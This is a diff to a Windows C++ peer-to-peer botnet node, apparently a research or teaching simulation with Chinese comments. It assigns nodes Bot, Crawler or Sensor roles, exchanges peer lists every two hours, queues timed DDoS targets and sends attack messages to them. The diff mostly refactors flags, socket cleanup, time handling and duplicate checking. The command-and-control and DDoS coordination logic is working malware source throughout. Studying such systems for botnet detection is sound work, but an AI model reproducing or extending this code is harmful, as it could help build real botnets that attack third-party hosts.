@@ -6,8 +6,16 @@
 #include <mutex>
 #include <tchar.h>
 using namespace std;
+typedef struct peerlist {
+    char IP[16];
+    char Port[5];
+    char ddos_time[15];
+}PeerList;
+vector<PeerList> vec_Peerlist;      // peerlist清單
+vector<PeerList> vec_Ddoslist;
+vector<PeerList> vec_Sensorlist;
 
-void register_console();
+bool register_console();
 bool register_controller();
 void accept_thread();
 void client_thread();
@@ -19,17 +27,12 @@ int handle_send_mes(char ,char *);
 char handle_recv_mes(char []);
 void time_to_int(char [], int []);
 void update_time(int []);
+bool add_time(int , int , int []);
 bool compare_with_time(int [], int []);
 int check_exit();
 int check_time();
-typedef struct peerlist {
-    char IP[16];
-    char Port[5];
-    char ddos_time[15];
-}PeerList;
-vector<PeerList> vec_Peerlist;      // peerlist清單
-vector<PeerList> vec_Ddoslist;
-vector<PeerList> vec_Sensorlist;
+int find_repeat_list(vector<PeerList> , PeerList );
+
 
 HANDLE QMutex;                      // Lock
 mutex change_mtx;
@@ -38,6 +41,12 @@ vector<_thread *> ClientT;          // Collect _thread
 
 _socketserver *s;
 #define IDLE 5000
+#define change_time 7200000 // 兩小時交換一次
+#define Host_flag  -1
+#define Bot_flag 1
+#define Crawler_flag 2
+#define Sensor_flag  3
+
 bool server_status = false;
 bool debug_mode = false;
 char my_ip[15] = "127.0.0.1", my_port[15] = "8000";
@@ -46,7 +55,7 @@ char* Concole_IP =  c_ip, * Concole_Port = c_port;
 char* MY_IP = my_ip, *MY_PORT = my_port;
 char time_stamp[15] = "20180823115900";
 const int MAXPLNum = 15 ;
-int register_flag = -1; // Bot = 1, Crawler = 2, Sensor = 3
+int register_flag = Host_flag; // Bot = 1, Crawler = 2, Sensor = 3
 int delay = 0;
 int time_rate = 2000;
 int main(int argc, char* argv[]) {
@@ -95,18 +104,22 @@ int main(int argc, char* argv[]) {
     _thread time_t((int (*)()) check_time);       // check_exit
     time_t.start();
 
-    register_console();         // 與Console註冊
+    bool console_flag = false;
+    while ((!console_flag) && server_status) {
+        console_flag = register_console();
+        Sleep(1000);
+    }
     change_mtx.lock(); // 鎖住，等待 Change 指令
 
-    if(register_flag == 1){
+    if(register_flag == Bot_flag){
         _thread bot_t((int (*)()) bot);
         bot_t.start();
     }
-    else if(register_flag == 2){
+    else if(register_flag == Crawler_flag){
         _thread  crawler_t((int (*)())  crawler);
         crawler_t.start();
     }
-    else if(register_flag == 3){
+    else if(register_flag == Sensor_flag){
         _thread sensor_t((int (*)()) sensor);
         sensor_t.start();
     }
@@ -125,36 +138,29 @@ int main(int argc, char* argv[]) {
     int inst = 0;
     int num = 0;
     if(debug_mode){
-        printf("\n----------------------------------\n");
-        printf("-----Input '1'  :Peerlist Size----\n");
-        printf("-----Input '3'  :Peerlist IP------\n");
-        printf("-----Input '4'  :Show Time------\n");
-        printf("-----Input '5'  :Show DDOS------\n");
-        printf("-----Input '-1' :Exit-------------\n");
-        printf("----------------------------------\n");
-        
-        while(server_status){
-            scanf("%d",&inst);
-            if(inst == 1)
-                cout << my_ip <<":"<< my_port << "-->" <<"Peerlise_Size :" << vec_Peerlist.size() << endl;
-            else if(inst == 2){
-                scanf("%d",&num);
-                printf("[%s:%s]\n",vec_Peerlist[num].IP, vec_Peerlist[num].Port);
-            }
-            else if(inst == 3){
-                int len = vec_Peerlist.size();
-                for(int i=0;i < len;i++)
-                    printf("[%s:%s]\n",vec_Peerlist[i].IP, vec_Peerlist[i].Port);
-            }
-            else if(inst == 4)
-                printf("[Time] :%s\n",time_stamp);
-            else if(inst == 5){
+        while (server_status) {
+            printf("\n----------------------------------\n");
+            printf("-----Input '1'  :Peer List -------\n");
+            printf("-----Input '2'  :Show Time--------\n");
+            printf("-----Input '3'  :Show DDOS--------\n");
+            printf("-----Input '4'  :Clear Screen-----\n");
+            printf("-----Input '-1' :Exit-------------\n");
+            printf("----------------------------------\n");
+            scanf("%d", &inst);
+            if (inst == 1) {
+                    printf("\n-----------PeerList = %d -----------\n", vec_Peerlist.size());
+                    for (int i = 0; i < vec_Peerlist.size(); i++)
+                        printf("[%s:%s ]\n", vec_Peerlist[i].IP, vec_Peerlist[i].Port);
+            }else if (inst == 2)
+                printf("[Time] :%s:%d\n", time_stamp, time_rate);
+            else if (inst == 3) {
                 int len = vec_Ddoslist.size();
-                for(int i=0;i < len;i++)
-                    printf("[DDOS Queue No.%d] %s:%s  [Time] %s\n",i+1,vec_Ddoslist[i].IP,vec_Ddoslist[i].Port,vec_Ddoslist[i].ddos_time );
-            }
-
-            else if(inst == -1)
+                for (int i = 0; i < len; i++)
+                    printf("[DDOS Queue No.%d] %s:%s  [Time] %s\n", i + 1, vec_Ddoslist[i].IP, vec_Ddoslist[i].Port,
+                           vec_Ddoslist[i].ddos_time);
+            }else if (inst == 4) {
+                system("CLS");
+            } else if (inst == -1)
                 break;
         }
     }
@@ -169,13 +175,13 @@ int main(int argc, char* argv[]) {
     CloseHandle(QMutex);
     return 0;
 }
-void register_console(){
+bool register_console(){
 
     char *send_data = new char[1024];
     char *rec_data = new char[1024];
     const char *p = ":";
     char *buf={};
-
+    bool flag = false;
     // Console
     _socket c( Concole_IP,  Concole_Port, 1024); // socket Console
     if(c.get_status()){
@@ -189,75 +195,32 @@ void register_console(){
                 if(debug_mode)
                     cout <<"[Receive] Console :"<<  rec_data << endl << endl;
                 buf = strtok(rec_data,p);
-                if(strcmp(buf,"Change") == 0 ){
-                    buf=strtok(NULL,p);
-                    if(strcmp(buf,"Bot") == 0 ){
-                        register_flag = 1;
-                        buf=strtok(NULL,p);
-                        if(strcmp(buf,"1") == 0 )
-                            delay = 1;
-                    }
-                    else if(strcmp(buf,"Crawler") == 0 )
-                        register_flag = 2;
-                    else if(strcmp(buf,"Sensor") == 0 )
-                        register_flag = 3;
-
-                    if( (register_flag == 1)|| (register_flag == 2) ){  // Bot & Crawler 要求 Peerlist
-                        c.send_((char *) "Request:Peerlist");
-                        memset(rec_data,'\0',1024);
-                        rec_data = c.recv_();
-                        if(rec_data){
-                            if(register_flag == 1){            // Bot
-                                c.send_((char *)"EXIT" );
-                                handle_recv_mes(rec_data);
-                                change_mtx.unlock();
-                            }
-                            else if(register_flag == 2){        //  Crawler 要求 Sensorlist
-                                c.send_((char *)"Request:Sensorlist" );
-                                memset(rec_data,'\0',1024);
-                                rec_data = c.recv_();
-                                if(rec_data){
-                                    c.send_((char *)"EXIT" );
-                                    handle_recv_mes(rec_data);
-                                    change_mtx.unlock();
-                                }
-                                else{
-                                    if(debug_mode)
-                                        printf("[INFO] Request Sensorlist failed\n");
-                                }
-                            }
-                        }
-                        else{
-                            if(debug_mode)
-                                printf("[INFO] Request Peerlist failed\n");
-                            register_flag = -1;
-                        }
-                    }
-                    else if(register_flag == 3){            // Sensor
-                        change_mtx.unlock();
-                    }
-                }
-                else if(strcmp(buf,"OK") == 0 ){
-                    register_flag = -1;
+                if(strcmp(buf,"OK") == 0 ){
+                    register_flag = Host_flag;
+                    flag = true;
                 }
             }
             else{
                 if(debug_mode)
                     printf("[INFO] Register Console failed\n");
-                register_flag = -1;
+                register_flag = Host_flag;
             }
         }
+        c.shutdown_(_socket::BOTH);
+        c.close_();
     }
     else{
+        c.close_();
         if(debug_mode)
             printf("[INFO] Register Console failed\n");
-        register_flag = -1;
+        register_flag = Host_flag;
     }
-    c.close_();
+
 
 
     delete[] send_data;
     delete[] rec_data;
+    return flag;
 }
 bool register_controller(){
     char *send_data = new char[1024];
@@ -288,12 +251,15 @@ bool register_controller(){
                     printf("[INFO] Register Controller failed\n");
             }
         }
+        ctrl.shutdown_(_socket::BOTH);
+        ctrl.close_();
     }
     else{
+        ctrl.close_();
         if(debug_mode)
             printf("[INFO] Register Controller failed\n");
     }
-    ctrl.close_();
+
     delete[] send_data;
     delete[] rec_data;
     return flag;
@@ -340,7 +306,7 @@ void client_thread() {
                 int temp = rand()%5000;
                 Sleep(temp);
         }
-        if( (rec_flag ==  'E') && (register_flag!=3)){
+        if( (rec_flag ==  'E') && (register_flag!=Sensor_flag)){
             handle_send_mes(rec_flag,send_data);
             client->send_(send_data);
         }
@@ -355,7 +321,7 @@ void client_thread() {
                 handle_recv_mes(rec_data);
                 if(rec_flag == 'B'){
                     client->send_((char *)"EXIT" );
-                    register_flag = 1;
+                    register_flag = Bot_flag;
                     change_mtx.unlock();
                 }
                 else if (rec_flag == 'C'){
@@ -363,7 +329,7 @@ void client_thread() {
                     memset(rec_data,'\0',1024);
                     rec_data = client->recv_();
                     if(rec_data){
-                        register_flag = 2;
+                        register_flag = Crawler_flag;
                         handle_recv_mes(rec_data);
                         client->send_((char *)"EXIT" );
                         change_mtx.unlock();
@@ -373,16 +339,17 @@ void client_thread() {
             else{
                 if(debug_mode)
                     printf("[INFO] Request Peerlist failed\n");
-                register_flag = -1;
+                register_flag = Host_flag;
             }
         }
         else if(rec_flag == 'S'){
-            register_flag = 3;
+            register_flag = Sensor_flag;
             change_mtx.unlock();
         }
     }
 
 
+    client->shutdown_(_socket::BOTH);
     client->close_();
     delete client;
     delete[] rec_data;
@@ -393,28 +360,36 @@ void bot(){
     if(debug_mode)
         printf("-------Bot--------\n");
     Sleep(3000);
-    while(server_status){
-        if(vec_Peerlist.size() > 1){
-            send_mes('E');        // Exchange_PeerList
-        }
-        if(vec_Ddoslist.size() > 0){
-            if( strcmp(time_stamp,vec_Ddoslist[0].ddos_time) >= 0){
-                send_mes('A');    // Attack
+    int count_time = 0;
+    while(server_status){    // Server 有無啟動
+        if (count_time >= change_time){
+            count_time = 0;
+            if(vec_Peerlist.size() > 1)
+                send_mes('E');        // Exchange_PeerList
+            if(vec_Ddoslist.size() > 0){
+                if( strcmp(time_stamp,vec_Ddoslist[0].ddos_time) >= 0)
+                    send_mes('A');    // Attack
             }
         }
-        Sleep(4000);
+        Sleep(500);
+        count_time += 500 * time_rate;
     }
 };
-void crawler(){
-    srand( (unsigned)time(NULL) );
-    if(debug_mode)
+void crawler() {
+    srand((unsigned) time(NULL));
+    if (debug_mode)
         printf("-------Crawler--------\n");
     Sleep(3000);
-    while(server_status){
-        if( (vec_Peerlist.size() > 0) && (vec_Sensorlist.size() > 0) ){
-            send_mes('E');
+    int count_time = 0;
+    while (server_status) {
+        if (count_time >= change_time) {
+            count_time = 0;
+            if ((vec_Peerlist.size() > 0) && (vec_Sensorlist.size() > 0))
+                send_mes('E');
+
         }
-        Sleep(4000);
+        Sleep(500);
+        count_time += 500 * time_rate;
     }
 }
 void sensor(){
@@ -448,15 +423,23 @@ void send_mes(char flag){
                 if(debug_mode)
                     printf("Recv Time out\n");
             }
+            c.shutdown_(_socket::BOTH);
+            c.close_();
         }
         c.close_();
     }
     else if(flag =='D'){    // DDOS
         for(int i=0 ;i < vec_Peerlist.size(); i++){
             _socket c( vec_Peerlist[i].IP,  vec_Peerlist[i].Port, 1024); // socket
-            if(c.get_status() )
+            if(c.get_status() ){
                 c.send_(send_data );
-            c.close_();
+                c.shutdown_(_socket::BOTH);
+                c.close_();
+            }
+            else{
+                c.close_();
+            }
+
             Sleep(500);
         }
     }
@@ -467,8 +450,13 @@ void send_mes(char flag){
             vec_Peerlist.erase(vec_Peerlist.begin() );
             if(debug_mode)
                 cout << "[Report] "<< "Controller " <<"--->:[" << send_data << "]"<<endl;
+            c.shutdown_(_socket::BOTH);
+            c.close_();
         }
-        c.close_();
+        else{
+            c.close_();
+        }
+
     }
     else if(flag =='A'){    // Attack DDOS IP
         _socket c( vec_Ddoslist[0].IP,  vec_Ddoslist[0].Port, 1024); // socket
@@ -478,12 +466,15 @@ void send_mes(char flag){
                 printf("[DDOS]--->%s:%s  [Time] %s\n",vec_Ddoslist[0].IP,vec_Ddoslist[0].Port,vec_Ddoslist[0].ddos_time );
             }
             vec_Ddoslist.erase(vec_Ddoslist.begin());
+            c.shutdown_(_socket::BOTH);
+            c.close_();
         }
         else{
             if(debug_mode)
                 printf("[DDOS] Can't Connect\n");
+            c.close_();
         }
-        c.close_();
+
     }
     delete[] rec_data;
     delete[] send_data;
@@ -495,7 +486,7 @@ int handle_send_mes(char flag, char *send_buf){
     char time_expire[15]={}, instr[20];
 
     time_to_int(time_stamp,time_t); //   [0]年 [1]月 [2]日 [3]時 [4]分 [5]秒
-    time_t[2] = time_t[2] + 3; // 訊息三天過期
+    add_time(2,3,time_t); // 訊息三天過期
     sprintf(time_expire,"%04d%02d%02d%02d%02d%02d",time_t[0],time_t[1],time_t[2],time_t[3],time_t[4],time_t[5]);
 
     send_num = rand()%vec_Peerlist.size();
@@ -506,9 +497,9 @@ int handle_send_mes(char flag, char *send_buf){
         do{
             tar_num = rand()%vec_Peerlist.size();
         }while((send_num == tar_num) || tar_num < 0);
-        if(register_flag == 1) // Bot
+        if(register_flag == Bot_flag) // Bot
             sprintf(send_buf,"%s:%s:%s:%s:%s:%s:%s",time_stamp ,time_expire ,instr ,vec_Peerlist[tar_num].IP ,vec_Peerlist[tar_num].Port, my_ip, my_port);
-        if(register_flag == 2){// Crawler
+        if(register_flag == Crawler_flag){// Crawler
             int  sensor_num =  rand()%vec_Sensorlist.size();
             sprintf(send_buf,"%s:%s:%s:%s:%s:%s:%s",time_stamp ,time_expire ,instr ,vec_Sensorlist[sensor_num].IP ,vec_Sensorlist[sensor_num].Port, my_ip, my_port);
         }
@@ -558,13 +549,24 @@ char handle_recv_mes(char data[]) {
                 else if(strcmp(buf,"Change") == 0){
                     buf=strtok(NULL,p);
                     if(strcmp(buf,"Bot") == 0 ){
-                        register_flag = 1;
-                        rtn_flag = 'B';
-                        buf=strtok(NULL,p);
-                        if(strcmp(buf,"1") == 0 ){
-                            if(debug_mode)
-                                printf("[Delay]\n");
-                            delay = 1;
+                        count = 0;
+                        buf = strtok(NULL, p);
+                        while (buf) {
+                            if (count % 2 == 0) {
+                                strcpy(p1.IP, buf);
+                            } else if (count % 2 == 1) {
+                                strcpy(p1.Port, buf);
+                                vec_Peerlist.push_back(p1);
+                            }
+                            count++;
+                            buf = strtok(NULL, p);
+                        }
+                        if (count == 0)
+                            rtn_flag = 'B';
+                        else {
+                            register_flag = Bot_flag;
+                            change_mtx.unlock();
+                            rtn_flag = 'N';
                         }
                     }
                     else if(strcmp(buf,"Crawler") == 0 )
@@ -633,12 +635,12 @@ char handle_recv_mes(char data[]) {
                 break;
             case 2 :
                 if(strcmp(buf,"Exchange_peerlist") == 0 ){
-                    if(register_flag == -1)
+                    if(register_flag == Host_flag)
                         return 'N';
                     ExPL_flag = true;
                 }
                 else if(strcmp(buf,"DDOS") == 0){
-                    if(register_flag == -1)
+                    if(register_flag == Host_flag)
                         return 'N';
                     DDOS_flag = true;
                 }
@@ -649,13 +651,8 @@ char handle_recv_mes(char data[]) {
             case 4 :
                 strcpy(p1.Port,buf);
                 if(ExPL_flag){
-                    for(int i=0 ;i < vec_Peerlist.size(); i++){ // 檢查 對方傳的IP,Port有無重複
-                        if(strcmp(vec_Peerlist[i].IP,p1.IP) == 0)
-                            if(strcmp(vec_Peerlist[i].Port,p1.Port) == 0){
-                                rtn_flag = 'E';
-                                break;
-                            }
-                    }
+                    if (find_repeat_list(vec_Peerlist, p1) >= 0)   // 檢查 對方傳的IP,Port有無重複
+                        rtn_flag = 'E'; // 重複
                     if(rtn_flag != 'E'){
                         vec_Peerlist.push_back(p1);
                         if ( (vec_Peerlist.size() > MAXPLNum)  ){    // Bot PeerList太多要刪掉
@@ -666,11 +663,8 @@ char handle_recv_mes(char data[]) {
                     }
                 }
                 else if (DDOS_flag){
-                    for(int i=0 ;i < vec_Ddoslist.size(); i++){ // 檢查 對方傳的IP,Port有無重複
-                        if(strcmp(vec_Ddoslist[i].IP,p1.IP) == 0)
-                            if(strcmp(vec_Ddoslist[i].Port,p1.Port) == 0)
-                                return 'N'; // IP重複
-                    }
+                    if (find_repeat_list(vec_Ddoslist, p1) >= 0)  // 檢查 DDOS 有無重複
+                        return 'N';
                     strcpy(p1.ddos_time,time_expire);
                     // 還要處理時間進位
                     vec_Ddoslist.push_back(p1);
@@ -755,6 +749,13 @@ void update_time(int t[]){
         t[1] = t[1] % 12;
         t[0] = t[0] + temp;
     }
+}
+bool add_time(int i, int addNum, int temp[]){
+    if( i > 5 || i < 0)
+        return false;
+    temp[i] = temp[i] + addNum;
+    update_time(temp);
+    return true;
 }
 
 bool compare_with_time(int a[], int b[]){
@@ -875,4 +876,14 @@ int check_time(){
         }
         Sleep(500);
     }*/
+}
+
+int find_repeat_list(vector<PeerList> vec, PeerList p) {
+    for (int i = 0; i < vec.size(); i++) { // 檢查 對方傳的IP,Port有無重複
+        if (strcmp(vec[i].IP, p.IP) == 0)
+            if (strcmp(vec[i].Port, p.Port) == 0) {
+                return i;    // 有重複的
+            }
+    }
+    return -1;   //  無重複
 }
